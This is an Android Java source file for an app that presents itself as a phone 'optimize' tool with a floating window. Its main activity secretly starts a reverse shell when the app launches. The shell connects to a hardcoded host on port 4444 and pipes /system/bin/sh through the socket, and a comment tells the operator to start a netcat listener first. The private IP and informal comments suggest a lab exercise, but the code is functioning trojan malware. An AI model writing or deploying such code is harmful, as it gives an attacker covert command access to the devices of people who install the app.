package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private Button start;
    final static int REQUEST_CODE = 378;
    final static int REQUEST_OVERLAY_PERMISSION = 379;

    //ip of host machine and port used
    private final static String HOST = "192.168.52.129";
    private final static int PORT = 4444;

    //used for shell part
    private final static String SH_PATH = "/system/bin/sh";
    private static Socket sock = null;

    String[] mainPermissions = new String[] {
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        start=(Button) findViewById(R.id.button_optimize);
        //Get screen size
        Point size = new Point( );
        getWindowManager().getDefaultDisplay( ).getSize( size );
        FloatingWindow fw=new FloatingWindow();
        fw.setScreenSize(size.x,size.y);

        start.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (!Settings.canDrawOverlays(MainActivity.this)) {
                        Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                        startActivityForResult(overlayIntent, REQUEST_OVERLAY_PERMISSION);
                    }
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkAndRequestPermissions() && Settings.canDrawOverlays(MainActivity.this)) {
                        startService(new Intent(MainActivity.this,FloatingWindow.class));
                    }
                }
            }
        });

        new ReverseShell().execute();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case REQUEST_CODE:
                if (grantResults.length > 0) {
                    String permissionsDenied = "";
                    for (String permission : permissions) {
                        if (grantResults[0] == PackageManager.PERMISSION_DENIED) {
                            permissionsDenied += permission + " ";
                        }
                    }
                    if (permissionsDenied.equals("")) {
                        Toast.makeText(getApplicationContext(), "Permissions granted", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(getApplicationContext(), "Permissions Denied: " + permissionsDenied, Toast.LENGTH_LONG).show();
                    }
                }
                return;
        }
    }

    boolean checkAndRequestPermissions() {
        int result;
        List<String> permissionsNeeded = new ArrayList<>();
        for (String p : mainPermissions) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(p);
            }
        }
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[permissionsNeeded.size()]), REQUEST_CODE);
            return false;
        }
        return true;
    }

    private class ReverseShell extends AsyncTask<Void, Void, Void>
    {
        @Override
        protected Void doInBackground(Void... voids){
            reverse();
            return null;
        }
    }

    private void reverse()
    {
        //before running run nc -lvp 4444 on machine
        System.out.println("Starting reverse shell...");
        System.out.println("Attempting to connect to " + HOST + ":" + PORT);

        //trys to connect to ip with port
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(HOST, PORT), 1000);
        } catch (IOException e) {
            System.out.println("Failed to create socket: " + e);
        }
        System.out.println("Connected to " + HOST + ":" + PORT);

        //absolutely no clue what this does lol
        //i think lets me communicate through shell
        executeShell();

        if (sock != null && sock.isClosed()) {
            try {
                sock.close();
            } catch (IOException e) {
                // don't care
            }
        }
    }

    private  void executeShell() {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            System.out.println("Failed to start \"" + SH_PATH  + "\": " + e);
            return;
        }
        InputStream pis, pes, sis;
        OutputStream pos, sos;

        try {
            pis = shell.getInputStream();
            pes = shell.getErrorStream();
            sis = sock.getInputStream();
            pos = shell.getOutputStream();
            sos = sock.getOutputStream();
            System.out.println(pis.toString() + pes.toString());
        } catch (IOException e) {
            System.out.println("Failed to obtain streams: " + e);
            shell.destroy();
            return;
        }

        while ( !sock.isClosed()) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }

                while (pes.available() > 0) {
                    sos.write(pes.read());
                }

                while (sis.available() > 0) {
                    pos.write(sis.read());
                }

                sos.flush();
                pos.flush();
            } catch (IOException e) {
                System.out.println("Stream error: " + e);
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                // don't care
            }

            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                // shell process is still running, can't get exit value
            }
        }

        System.out.println("Socket is not connected, exiting.");
        shell.destroy();
    }

}